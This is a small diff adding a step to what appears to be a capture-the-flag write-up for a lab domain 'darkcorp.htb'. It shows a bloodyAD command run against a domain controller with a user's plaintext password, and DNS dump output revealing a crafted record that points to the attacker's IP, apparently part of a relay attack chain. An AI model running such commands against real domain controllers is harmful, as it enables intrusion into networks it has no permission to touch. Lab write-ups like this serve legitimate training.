@@ -916,6 +916,15 @@ Ill then send the request again to connect back to drip server
 
 It looks to have worked
 
+```python
+bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u victor.r -p 'victor1gustavo@#' get dnsDump
+
+recordName: dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.darkcorp.htb
+A: 10.10.14.61
+```
+
+Then ill query DNS and i see that the record is there
+
 
 
 
